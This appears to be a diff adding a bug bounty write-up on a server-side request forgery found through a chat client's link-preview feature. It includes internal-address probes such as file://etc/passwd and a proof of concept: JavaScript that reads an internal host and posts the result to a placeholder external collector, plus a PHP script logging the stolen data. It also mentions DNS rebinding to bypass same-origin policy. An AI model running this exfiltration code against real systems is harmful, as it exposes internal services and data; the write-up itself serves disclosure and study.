@@ -1,0 +1,93 @@
+# [bugbounty]A Simple SSRF
+
+This is a private program
+First of all, its web assets have several subdomains. After I tested it for a while, I plan to check out the mac client.
+After installation, sign up for login, then I see a chat interface
+![enter image description here](./image/1.jpg)
+It seems to preview the url, return a title and favicons
+I use my server ip to test. Then received
+![enter image description here](./image/3.png)
+Found that is the browser's ua header
+Then I tested it http://127.0.0.1 https://127.0.0.1 file://etc/passwd ....
+Tested a lot of common internal ip
+But
+![enter image description here](./image/t1.png)
+![enter image description here](./image/t2.png)
+No effect
+Then I tried the subdomain brute force, as well as some asset discovery sites to find internal ip
+Until there is an ip
+![enter image description here](./image/t4.png)
+Seems to be successful
+Then I quickly submitted the vulnerability
+But
+![enter image description here](./image/t5.png)
+As written above, we can only get a very small amount of content.
+After testing, I found that it will also execute js because it is browser ua
+
+  
+
+ 
+
+    <html><p id='d1'></p>
+    <script>
+        function get(url) {
+            try {
+                var req = new XMLHttpRequest();
+                req.open('GET', url, false);
+                req.send(null);
+                if(req.status == 200)
+                    return req.responseText;
+            } catch(err) {
+            }
+            return null;
+        }
+        var role = get('https://google.com');
+        document.getElementById("d1").innerHTML=role.length;
+    </script></html>
+![enter image description here](./image/t5.png)
+Can successfully get Google returns the content length
+Does not seem to be blocked by Same Origin Policy
+Then we can get any internal network content
+**poc**
+xxx.php
+
+    <?php
+    file_put_contents("save.txt", $_POST['cc'] . "\n", FILE_APPEND);
+    ?>
+poc.html
+
+    <html><p id='d1'></p>
+    <script>
+    function get(url) {
+        try {
+            var req = new XMLHttpRequest();
+            req.open('GET', url, false);
+            req.send(null);
+            if(req.status == 200)
+                return req.responseText;
+        } catch(err) {
+        }
+        return null;
+    }
+    function post(url,content){
+        var req = new XMLHttpRequest();
+        req.open("POST", url, true);
+        var formData = new FormData();
+        formData.append("cc", content);
+        req.send(formData);
+    }
+    var role = get('https://Internal ip');
+    post('https://xxxxxxxxxxx.com/xxx.php',escape(role));
+    document.getElementById("d1").innerHTML=role.length;
+    </script></html>
+Then check save.txt
+![enter image description here](./image/t9.png)
+Url decoding
+![enter image description here](./image/t10.png)
+
+**If Same Origin Policy blocks**
+Bypass Same Origin Policy with DNS-rebinding to retrieve  Internal server .
+![enter image description here](https://user-images.githubusercontent.com/5891788/53449161-87e47300-3a19-11e9-8e3c-7b7bdfeaab6b.png)
+
+Details from https://github.com/mpgn/ByP-SOP
+Finally ![enter image description here](./image/t11.png)
